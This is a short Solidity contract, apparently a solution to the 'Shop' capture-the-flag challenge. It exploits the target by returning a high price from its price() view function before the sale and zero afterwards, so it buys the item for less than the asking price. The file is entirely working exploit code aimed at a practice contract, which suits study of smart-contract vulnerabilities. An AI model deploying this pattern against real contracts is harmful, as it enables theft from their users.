// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Shop.sol';

contract ShopAttacker {
    Shop public shop;

    constructor(address challengeAddress) {
        shop = Shop(challengeAddress);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : 100;
    }
}
